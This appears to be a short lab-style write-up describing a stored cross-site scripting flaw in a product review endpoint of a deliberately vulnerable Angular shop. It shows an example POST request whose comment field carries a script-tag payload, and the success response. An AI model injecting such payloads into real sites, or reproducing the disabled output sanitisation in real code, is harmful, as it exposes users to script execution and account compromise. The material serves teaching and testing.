# Stored Cross Site Scripting (XSS)
The stored variant XSS, like other variations, inject scripts into benign, non-attacker controlled websites.  The distinction is stored XSS  _stores_ the injected scripts/code on the server, resulting in the script persisting beyond the current HTTP session.

## Exploitation
**Prerequisites:** Authenticated, Ordered the Product
**Location:** _POST /productreviews_

While posting reviews HTML tags, including script, can be specified in the _comment_ parameter. The Angular application is configured to bypass Angular's two primary protections: encoding all interpolated variables and auto-removal of script tags which prevent Stored XSS (or any other XSS).  Below is an exploitation example:

    POST /productreviews
    raw:
    {
    "product" : {"id" : 1},
    "title" : "Disgusting",
    "grade" : 1,
    "comment" : "<script>alert(1);</script>"
    }

To execute the script go to the ProductPage of the review you POSTed to, in our case Product 1 or Vanilla Candle.

Successful exploitation looks like:

    {
        "success": true,
        "code": 200,
        "message": "Success"
    }
